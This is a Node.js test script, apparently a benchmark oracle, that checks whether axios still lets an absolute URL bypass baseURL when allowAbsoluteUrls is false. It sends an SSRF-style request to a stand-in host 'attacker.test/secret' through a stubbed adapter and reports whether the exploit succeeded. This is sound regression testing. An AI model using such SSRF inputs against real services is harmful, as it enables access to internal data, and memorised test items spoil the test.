const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const marker = `axios-ssrf-reg-${process.pid}-${Date.now()}`;
    const tmpDir = path.join(os.tmpdir(), marker);
    fs.mkdirSync(tmpDir, { recursive: true });

    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    // Benign operation: relative path with baseURL should be combined.
    let benignSeenUrl = '';
    try {
      const benignResp = await axios.get('/ok', {
        baseURL: 'http://example.test/base/',
        adapter: async (config) => {
          benignSeenUrl = String((config && config.url) || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: { oracle: true }
          };
        }
      });

      if (!benignResp || benignResp.status !== 200) {
        throw new Error('benign_status_not_200');
      }
      if (!benignSeenUrl || !benignSeenUrl.includes('/ok')) {
        throw new Error('benign_url_not_seen');
      }
      evidence += `benign_seen_url=${benignSeenUrl};`;
    } catch (e) {
      const msg = String((e && e.message) || e);
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: `benign_failed:${msg.slice(0, 200)}`
      }));
      return;
    }

    operation_completed = true;

    // Malicious input: absolute URL while allowAbsoluteUrls=false.
    // Vulnerable behavior: adapter receives absolute attacker URL unchanged.
    // Patched behavior: adapter receives combined URL rooted at baseURL (attacker URL embedded as path),
    // preventing SSRF to attacker host.
    const inst = axios.create({
      baseURL: 'http://example.test/base/',
      allowAbsoluteUrls: false
    });

    let seenMalUrl = '';
    let adapterCalled = false;

    try {
      await inst.get('http://attacker.test/secret?x=1', {
        adapter: async (config) => {
          adapterCalled = true;
          seenMalUrl = String((config && config.url) || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: { oracle: true }
          };
        }
      });

      if (!adapterCalled) {
        exploit_succeeded = false;
        evidence += 'malicious_blocked_no_adapter_call;';
      } else {
        const lower = seenMalUrl.toLowerCase();
        const vulnerablePattern = lower.startsWith('http://attacker.test/') || lower.startsWith('https://attacker.test/');
        exploit_succeeded = vulnerablePattern;
        evidence += `malicious_seen_url=${seenMalUrl};`;
      }
    } catch (e) {
      const msg = String((e && e.message) || e);
      if (!adapterCalled) {
        exploit_succeeded = false;
        evidence += `malicious_blocked_error=${msg.slice(0, 180)};`;
      } else {
        const lower = seenMalUrl.toLowerCase();
        const vulnerablePattern = lower.startsWith('http://attacker.test/') || lower.startsWith('https://attacker.test/');
        exploit_succeeded = vulnerablePattern;
        evidence += `malicious_seen_url=${seenMalUrl};error_after_adapter=${msg.slice(0, 140)};`;
      }
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
  } catch (e) {
    const msg = String((e && e.message) || e);
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: `setup_or_runtime_error:${msg.slice(0, 200)}`
    }));
  }
})();